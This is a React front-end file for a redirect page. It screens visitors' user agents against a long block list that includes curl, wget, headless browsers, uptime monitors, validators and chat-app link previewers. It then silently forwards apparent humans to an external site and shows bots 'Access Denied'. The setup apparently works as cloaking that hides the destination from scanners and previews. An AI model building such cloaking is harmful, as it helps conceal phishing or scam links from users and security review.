import { useEffect, useState } from 'react'
import './App.css'

const TARGET_URL = 'https://cityday-ac.vercel.app/'

// Comprehensive list of bot user agents (excluding common browser names)
const BOT_PATTERNS = [
  'bot', 'crawler', 'spider', 'scraper', 'scrape',
  'curl', 'wget', 'python-requests', 'java/', 'perl', 'ruby',
  'go-http-client', 'php', 'node-fetch', 'axios/', 'fetch/',
  'googlebot', 'bingbot', 'slurp', 'duckduckbot',
  'baiduspider', 'yandexbot', 'sogou', 'exabot',
  'facebot', 'ia_archiver', 'archive.org',
  'semrush', 'ahrefs', 'mj12bot', 'dotbot',
  'megaindex', 'blexbot', 'petalbot', 'applebot',
  'facebookexternalhit', 'twitterbot', 'linkedinbot',
  'whatsapp', 'telegrambot', 'discordbot', 'slackbot',
  'headlesschrome', 'headless', 'phantomjs', 'selenium', 'webdriver',
  'puppeteer', 'playwright', 'lighthouse', 'gtmetrix', 'pingdom', 'uptimerobot',
  'monitor', 'check', 'test', 'validator',
  'w3c_validator', 'css-validator', 'html-validator',
  'feed', 'rss', 'atom', 'syndication',
  'monitoring', 'uptime', 'ping', 'health',
  'analytics', 'tracking', 'stats'
]

function isBot(userAgent) {
  if (!userAgent) return true
  
  const ua = userAgent.toLowerCase()
  
  // Check against bot patterns
  for (const pattern of BOT_PATTERNS) {
    if (ua.includes(pattern)) {
      return true
    }
  }
  
  // Check for headless browser indicators (more specific)
  if (ua.includes('headless') || ua.includes('phantom')) {
    return true
  }
  
  // Check for missing common browser indicators
  // Real browsers have 'mozilla' and a browser engine
  const hasBrowserIndicators = 
    ua.includes('mozilla') && 
    (ua.includes('chrome/') || ua.includes('safari/') || ua.includes('firefox/') || ua.includes('edge/') || ua.includes('version/'))
  
  // If no browser indicators and very short UA, likely a bot
  if (!hasBrowserIndicators && ua.length < 30) {
    return true
  }
  
  // Check for suspicious patterns like standalone "chromium" without version
  if (ua === 'chromium' || ua === 'chrome' || ua === 'firefox' || ua === 'safari') {
    return true
  }
  
  return false
}

function App() {
  const [isChecking, setIsChecking] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)

  useEffect(() => {
    const checkAndRedirect = async () => {
      // Client-side bot detection
      const userAgent = navigator.userAgent || navigator.vendor || window.opera
      
      if (isBot(userAgent)) {
        setIsBlocked(true)
        setIsChecking(false)
        return
      }

      // Additional server-side check via API (only in production)
      // In local dev, API won't be available, so we skip it
      if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        try {
          const response = await fetch('/api/check-bot', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              userAgent: userAgent,
              referer: document.referrer,
              language: navigator.language,
              platform: navigator.platform,
            }),
          })

          const data = await response.json()
          
          if (data.isBot) {
            setIsBlocked(true)
            setIsChecking(false)
            return
          }
        } catch (error) {
          // If API fails, proceed with redirect (fail open for real users)
          console.error('Bot check API error:', error)
        }
      }

      // If not a bot, redirect immediately
      setIsChecking(false)
      window.location.replace(TARGET_URL)
    }

    checkAndRedirect()
  }, [])

  if (isChecking) {
    return (
      <div className="container">

      </div>
    )
  }

  if (isBlocked) {
    return (
      <div className="container">
        <div className="blocked">
          <h1>Access Denied</h1>
          <p>Automated access is not permitted.</p>
        </div>
      </div>
    )
  }

  return null
}

export default App

